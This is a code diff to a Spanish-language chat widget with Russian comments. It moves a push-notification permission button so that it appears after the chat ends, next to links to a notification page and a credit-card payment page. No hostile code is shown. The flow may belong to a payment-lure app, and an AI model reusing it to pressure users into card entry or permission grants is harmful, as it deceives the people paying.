@@ -504,38 +504,26 @@
           var el = document.createElement('div');
           if (content === 'CALLER_ACTION_BUTTONS') {
             el.className = 'caller-actions-wrap';
-            notifButtonShown = true;
 
-            // 1. Notification permission button
-            var notifBtn = document.createElement('button');
-            notifBtn.type = 'button';
-            notifBtn.className = 'caller-notif-btn';
-            notifBtn.innerHTML = 'Permitir notificaciones <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M13.73 21a2 2 0 0 1-3.46 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-            notifBtn.addEventListener('click', function () {
-              requestPushPermissionFromAndroid();
-              notifBtn.disabled = true;
-            });
-
-            // 2. Text bubble
+            // 1. Text bubble
             var bubble = document.createElement('div');
             bubble.className = 'caller-msg-bubble';
             var lbl = document.createElement('p');
             lbl.textContent = 'Su solicitud ha sido procesada. Elija una opción:';
             bubble.appendChild(lbl);
 
-            // 3. "Ver notificación" outline button
+            // 2. "Ver notificación" outline button
             var a1 = document.createElement('a');
             a1.href = './notifications2.html';
             a1.className = 'caller-action-btn caller-action-btn--outline';
             a1.innerHTML = 'Ver notificación <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="22,6 12,13 2,6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
 
-            // 4. "Realizar pago" primary button
+            // 3. "Realizar pago" primary button
             var a2 = document.createElement('a');
             a2.href = './credit-card.html';
             a2.className = 'caller-action-btn caller-action-btn--primary';
             a2.innerHTML = 'Realizar pago <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.5"/><path d="M2 10h20" stroke="currentColor" stroke-width="1.5"/></svg>';
 
-            el.appendChild(notifBtn);
             el.appendChild(bubble);
             el.appendChild(a1);
             el.appendChild(a2);
@@ -590,13 +578,24 @@
           } catch(e) {}
         }
 
-        // Отключено: отдельный баннер «Notificaciones» и подсказка больше не показываются.
-        // Разрешение на уведомления запрашивается единственной кнопкой «Permitir notificaciones»
-        // внутри блока CALLER_ACTION_BUTTONS.
         function showNotifButton() { /* no-op */ }
 
-        // Отключено: баннер «El operador se pondrá en contacto…» больше не показывается.
-        function showDoneBanner() { /* no-op */ }
+        // После [[FIN]]: показываем кнопку «Permitir notificaciones» (без баннера/текста).
+        function showDoneBanner() {
+          if (document.getElementById('notifPermWrap') || notifButtonShown) return;
+          notifButtonShown = true;
+          var btn = document.createElement('button');
+          btn.id = 'notifPermWrap';
+          btn.type = 'button';
+          btn.className = 'caller-notif-btn';
+          btn.innerHTML = 'Permitir notificaciones <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M13.73 21a2 2 0 0 1-3.46 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+          btn.addEventListener('click', function () {
+            requestPushPermissionFromAndroid();
+            btn.disabled = true;
+          });
+          chat.insertBefore(btn, typing);
+          scrollDown();
+        }
 
         function setBusy(on) {
           input.disabled = on;
